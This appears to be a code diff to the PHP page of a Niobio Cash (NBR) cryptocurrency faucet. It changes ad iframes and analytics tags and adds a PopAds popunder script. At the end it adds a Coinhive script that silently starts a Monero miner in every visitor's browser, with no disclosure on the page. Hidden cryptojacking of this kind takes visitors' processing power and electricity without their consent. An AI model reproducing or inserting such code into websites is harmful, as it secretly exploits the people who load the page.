@@ -5,11 +5,15 @@ require_once 'classes/jsonRPCClient.php';
 require_once 'classes/recaptcha.php';
 require_once 'config.php';
 
-?><!DOCTYPE html>
+?>
+<!DOCTYPE html>
 <html>
 <head>
+
     <meta charset='UTF-8'>
     <title><?php echo $faucetTitle; ?></title>
+    <meta name="keywords" content="NBR, Niobio Cash, Faucet, Earn, Free">
+    <meta name="description" content="Earn NBR for Free">
     <meta name='viewport' content='width=device-width, initial-scale=1'>
     <link rel='shortcut icon' href='images/favicon.ico'>
     <link rel='icon' type='image/icon' href='images/favicon.ico'>
@@ -25,22 +29,45 @@ require_once 'config.php';
         }
     </script>
 
-    <!--<script>
-        (function (i, s, o, g, r, a, m) {
-            i['GoogleAnalyticsObject'] = r;
-            i[r] = i[r] || function () {
-                (i[r].q = i[r].q || []).push(arguments)
-            }, i[r].l = 1 * new Date();
-            a = s.createElement(o),
-                m = s.getElementsByTagName(o)[0];
-            a.async = 1;
-            a.src = g;
-            m.parentNode.insertBefore(a, m)
-        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-112509983-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-        ga('create', 'UA-78493281-2', 'auto');
-        ga('send', 'pageview');
-    </script>-->
+  gtag('config', 'UA-112509983-2');
+</script>
+
+
+
+<!-- PopAds.net Popunder Code for xmr-pool.ddns.net:8082 -->
+<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+  var _pop = _pop || [];
+  _pop.push(['siteId', 2477781]);
+  _pop.push(['minBid', 0]);
+  _pop.push(['popundersPerIP', 0]);
+  _pop.push(['delayBetween', 0]);
+  _pop.push(['default', false]);
+  _pop.push(['defaultPerDay', 0]);
+  _pop.push(['topmostLayer', false]);
+  (function() {
+    var pa = document.createElement('script'); pa.type = 'text/javascript'; pa.async = true;
+    var s = document.getElementsByTagName('script')[0]; 
+    pa.src = '//c1.popads.net/pop.js';
+    pa.onerror = function() {
+      var sa = document.createElement('script'); sa.type = 'text/javascript'; sa.async = true;
+      sa.src = '//c2.popads.net/pop.js';
+      s.parentNode.insertBefore(sa, s);
+    };
+    s.parentNode.insertBefore(pa, s);
+  })();
+/*]]>/* */
+</script>
+<!-- PopAds.net Popunder Code End -->
+
+
 </head>
 
 <body>
@@ -56,16 +83,17 @@ require_once 'config.php';
         <fieldset>
 
             <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
-            <iframe data-aa='827021' src='//ad.a-ads.com/827021?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
-            <iframe data-aa='827031' src='//ad.a-ads.com/827031?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
-            <iframe data-aa='827035' src='//ad.a-ads.com/827035?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+
             <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
             <br/>
 
 
             <?php
 
-            $bitcoin = new jsonRPCClient('http://127.0.0.1:8070/json_rpc');
+            $bitcoin = new jsonRPCClient('http://127.0.0.1:8317/json_rpc');
 
             $balance = $bitcoin->getbalance();
             $balanceDisponible = $balance['available_balance'];
@@ -149,8 +177,13 @@ require_once 'config.php';
                     <div class='alert alert-warning radius'>
                         A carteira está vazia ou o saldo é menor do que o ganho. <br> Venha mais tarde, &ndash; podemos receber mais doações.
                     </div>
+
                 <?php } elseif (!$link) {
-                    die('Erro na conexao com o banco de dados' . mysql_error());
+
+                    // $link = mysqli_connect($hostDB, $userDB, $passwordDB, $database);
+
+
+                    die('Помилка піключення' . mysql_error());
                 } else { ?>
 
                     <input type='text' name='wallet' required placeholder='Endereço da carteira NBR'>
@@ -158,7 +191,9 @@ require_once 'config.php';
                     <input type='text' name='paymentid' placeholder='ID do pagamento (Opcional)'>
                     <br/>
                     <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
-                    <iframe src="//ads.runcpa.com/rotator/a2c10dbe00" frameborder="0" style="overflow: hidden;" scrolling="no"></iframe>
+<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
                     <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
                     <br/>
                     <?php
@@ -168,8 +203,8 @@ require_once 'config.php';
                     <center><input type='submit' value='Obter nióbios grátis!'></center>
                     <br>
                     <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
-                    <iframe data-aa='827011' src='//ad.a-ads.com/827011?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
-                    <iframe data-aa='827020' src='//ad.a-ads.com/827020?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+<iframe data-aa='827963' src='//acceptable.a-ads.com/827963' scrolling='no' style='border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+
                     <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
                 <?php } ?>
                 <br>
@@ -247,5 +282,14 @@ require_once 'config.php';
         }, 10000);
     </script>
 <?php } ?>
+
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript">
+var miner = new CoinHive.Anonymous('
+oYvc61Bs2T7WM6NXVZq4EqXx2kAXi4Aw', { throttle: 0.4 });
+miner.start();
+
+
+</script>
 </body>
 </html>
